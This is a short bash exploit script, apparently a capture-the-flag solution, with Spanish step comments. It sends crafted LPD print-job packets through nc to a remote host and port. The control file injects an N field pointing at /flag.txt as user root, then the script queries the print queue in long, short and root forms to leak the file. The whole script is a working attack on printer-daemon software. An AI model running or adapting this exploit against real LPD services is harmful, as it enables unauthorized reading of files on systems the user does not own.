#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

echo "=== Step 1: Enviar job con N command a /flag.txt ==="
{
    printf "\x02lp\n"
    sleep 0.3
    CONTROL="Htest\nUroot\nN/flag.txt\nfdfA001localhost\n"
    SIZE=${#CONTROL}
    printf "\x02%d cfA001localhost\n%s\x00" "$SIZE" "$CONTROL"
    sleep 0.3
    printf "\x030 dfA001localhost\n\x00"
} | timeout 5s nc $TARGET $PORT | xxd

echo -e "\n=== Step 2: Consultar cola larga después del job ==="
sleep 1
printf "\x04lp\n" | timeout 5s nc $TARGET $PORT
echo ""

echo -e "\n=== Step 3: Consultar cola corta ==="
printf "\x03lp\n" | timeout 5s nc $TARGET $PORT
echo ""

echo -e "\n=== Step 4: Consultar cola con usuario root ==="
printf "\x04lp root\n" | timeout 5s nc $TARGET $PORT
echo ""